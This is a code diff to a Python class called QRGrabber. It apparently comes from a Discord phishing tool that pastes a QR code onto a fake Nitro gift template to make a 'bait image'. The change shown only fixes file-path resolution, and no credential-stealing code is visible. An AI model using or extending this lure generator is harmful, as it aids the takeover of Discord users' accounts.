@@ -38,11 +38,7 @@ class QRGrabber:
         \nThis QR code will be placed upon a Discord Nitro template to form a full bait image.
         """
         qr_img = Image.open(path_1, 'r')
-        ovly_img = Image.open(
-            os.path.join(
-                self.resources_path,
-                'overlay.png'),
-            'r')
+        ovly_img = Image.open(os.path.join(os.path.dirname(os.path.realpath(__file__)) ,self.resources_path, 'overlay.png'), 'r')
         qr_img.paste(ovly_img, (60, 55))
         qr_img.save(path_2, quality=95)
 
@@ -50,11 +46,7 @@ class QRGrabber:
     def generate_nitro_template(self, path_2: str) -> None:
         #Generates a Discord Nitro template using the files in the resources directory.
         #This template will be used to form a full bait image after a QR code pasted on it.
-        nitro_template = Image.open(
-            os.path.join(
-                self.resources_path,
-                'template.png'),
-            'r')
+        nitro_template = Image.open(os.path.join(os.path.dirname(os.path.realpath(__file__)) , self.resources_path, 'template.png'), 'r')
         nitro_template.paste(Image.open(path_2, 'r'), (120, 409))
         nitro_template.save('discord_gift.png', quality=95)
 
